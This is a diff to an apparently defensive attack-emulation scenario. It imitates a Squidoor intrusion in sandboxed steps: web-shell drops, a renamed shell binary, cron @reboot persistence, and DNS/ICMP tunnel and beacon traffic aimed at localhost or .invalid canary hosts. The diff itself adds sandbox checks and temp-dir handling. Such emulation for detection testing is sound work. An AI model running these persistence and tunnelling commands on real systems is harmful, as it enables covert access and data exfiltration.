@@ -193,6 +193,7 @@ steps:
   - id: step-01
     name: "Decode .aspx web shells into the webroot and run recon from the web-service account"
     command: |
+      rm -rf /tmp/cortexsim-mp023 && mkdir -m 700 /tmp/cortexsim-mp023 || { echo "sandbox /tmp/cortexsim-mp023 could not be created fresh: something else is at that path" >&2; exit 1; }
       STAGE=/tmp/cortexsim-mp023
       WEBROOT="${WEBROOT:-$STAGE/www}"
       mkdir -p "$WEBROOT" "$STAGE/drop"
@@ -231,6 +232,7 @@ steps:
   - id: step-02
     name: "Disguise a web shell as a certificate and push it to a peer server with curl"
     command: |
+      [ "$(stat -c %F:%u:%a /tmp/cortexsim-mp023 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /tmp/cortexsim-mp023 is missing or not ours: step-01 did not complete" >&2; exit 1; }
       STAGE=/tmp/cortexsim-mp023
       WEBROOT="${WEBROOT:-$STAGE/www}"
       cp "$WEBROOT/Error.aspx" "$STAGE/drop/server.crt"
@@ -253,6 +255,7 @@ steps:
   - id: step-03
     name: "Renamed system binary (fontdrvhost) executes a config.ini payload script — host recon"
     command: |
+      [ "$(stat -c %F:%u:%a /tmp/cortexsim-mp023 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /tmp/cortexsim-mp023 is missing or not ours: step-01 did not complete" >&2; exit 1; }
       STAGE=/tmp/cortexsim-mp023
       mkdir -p "$STAGE/ProgramData"
       cp /bin/sh "$STAGE/ProgramData/fontdrvhost"
@@ -289,6 +292,7 @@ steps:
   - id: step-04
     name: "Persist the loader as EPolicyManager (cron @reboot; Windows scheduled task)"
     command: |
+      [ "$(stat -c %F:%u:%a /tmp/cortexsim-mp023 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /tmp/cortexsim-mp023 is missing or not ours: step-01 did not complete" >&2; exit 1; }
       STAGE=/tmp/cortexsim-mp023
       crontab -l > "$STAGE/drop/crontab.before" 2>/dev/null
       ( cat "$STAGE/drop/crontab.before"; echo "@reboot $STAGE/ProgramData/fontdrvhost $STAGE/ProgramData/config.ini # EPolicyManager cortexsim-mp023" ) | crontab -
@@ -315,6 +319,7 @@ steps:
   - id: step-05
     name: "Squidoor C2 channels: Outlook-drafts beacon shape, Pastebin check-in, report-domain DNS lookups"
     command: |
+      [ "$(stat -c %F:%u:%a /tmp/cortexsim-mp023 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /tmp/cortexsim-mp023 is missing or not ours: step-01 did not complete" >&2; exit 1; }
       STAGE=/tmp/cortexsim-mp023
       mkdir -p "$STAGE/Explorer/UUID"
       printf "%s\n" "graph_refresh_token=CORTEXSIM-INERT-NOT-A-TOKEN" > "$STAGE/Explorer/UUID/7d3c2a10-cortexsim-mp023"
@@ -382,6 +387,7 @@ steps:
   - id: step-06
     name: "ICMP tunnel shape (padded echo payload) and long-label DNS tunnel queries to a lab zone"
     command: |
+      [ "$(stat -c %F:%u:%a /tmp/cortexsim-mp023 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /tmp/cortexsim-mp023 is missing or not ours: step-01 did not complete" >&2; exit 1; }
       STAGE=/tmp/cortexsim-mp023
       ping -c 4 -s 512 -p 6d703032332d69636d70 "${STAGE_HOST:-127.0.0.1}" > "$STAGE/drop/icmp.out" 2>&1
       for i in 1 2 3 4 5 6; do dig +short "$(head -c 30 /dev/urandom | base32 | tr -d = | tr A-Z a-z).t.cortexsim-canary.invalid" @${LAB_RESOLVER:-127.0.0.53}; done
@@ -411,12 +417,13 @@ steps:
   - id: step-07
     name: "NGFW EAL leg: recurring beacon from the run host to the published domains/IPs"
     command: |
+      C=$(mktemp -d /tmp/cortexsim.XXXXXX) || exit 1; trap 'rm -rf "$C"' EXIT
       : "${COLLECTOR_URL:=https://collector.cortexsim-canary.invalid/ngfw/eal/events}"
       : "${COLLECTOR_HOST:=collector.cortexsim-canary.invalid}"
       SRC_IP=$(hostname -I | awk '{print $1}')
       SRC_HOST=$(hostname -s)
       SRC_USER=$(id -un www-data 2>/dev/null || id -un)
-      cat > /tmp/mp-023-ngfw-eal.yml <<YML
+      cat > "$C/mp-023-ngfw-eal.yml" <<YML
       campaign_id: CMP-MP-EAL-023
       name: "Squidoor C2 egress from the run host to published CL-STA-0049 infrastructure"
       authorized_by: "domain-consultant@paloaltonetworks.com"
@@ -464,7 +471,7 @@ steps:
             src_host: "$SRC_HOST"
             src_user: "$SRC_USER"
       YML
-      python3 -m scripts.eal_simulator.cli run /tmp/mp-023-ngfw-eal.yml --live
+      python3 -m scripts.eal_simulator.cli run "$C/mp-023-ngfw-eal.yml" --live
       echo cortexsim-mp023-step07-ngfw-eal-beacon-emitted
     identity: container-runtime
     mitre_technique: "T1071.001"
@@ -499,12 +506,13 @@ steps:
   - id: step-08
     name: "NGFW threat leg: WildFire malicious verdict for config.ini's published SHA-256 — correlation"
     command: |
+      C=$(mktemp -d /tmp/cortexsim.XXXXXX) || exit 1; trap 'rm -rf "$C"' EXIT
       : "${COLLECTOR_URL:=https://collector.cortexsim-canary.invalid/ngfw/threat/events}"
       : "${COLLECTOR_HOST:=collector.cortexsim-canary.invalid}"
       SRC_IP=$(hostname -I | awk '{print $1}')
       SRC_HOST=$(hostname -s)
       SRC_USER=$(id -un www-data 2>/dev/null || id -un)
-      cat > /tmp/mp-023-ngfw-threat.yml <<YML
+      cat > "$C/mp-023-ngfw-threat.yml" <<YML
       campaign_id: CMP-MP-THREAT-023
       name: "Squidoor config.ini WildFire verdict on the run host"
       authorized_by: "domain-consultant@paloaltonetworks.com"
@@ -530,7 +538,7 @@ steps:
             src_user: "$SRC_USER"
             iterations: 1
       YML
-      python3 -m scripts.eal_simulator.cli run /tmp/mp-023-ngfw-threat.yml --live
+      python3 -m scripts.eal_simulator.cli run "$C/mp-023-ngfw-threat.yml" --live
       echo cortexsim-mp023-step08-ngfw-threat-log-emitted
     identity: container-runtime
     mitre_technique: "T1105"
@@ -563,7 +571,7 @@ steps:
 cleanup:
   commands:
     - "crontab -u www-data -l 2>/dev/null | grep -v cortexsim-mp023 | crontab -u www-data - || true"
-    - "rm -rf /tmp/cortexsim-mp023 /tmp/mp-023-ngfw-eal.yml /tmp/mp-023-ngfw-threat.yml"
+    - "rm -rf /tmp/cortexsim-mp023"
     - "schtasks.exe /delete /f /tn \"Microsoft\\Windows\\AppID\\EPolicyManager\""
     - "Remove-Item -Recurse -Force -ErrorAction SilentlyContinue C:\\ProgramData\\cortexsim-mp023, HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UUID\\7d3c2a10-cortexsim-mp023"
     - "echo cortexsim-mp023-cleanup-complete"
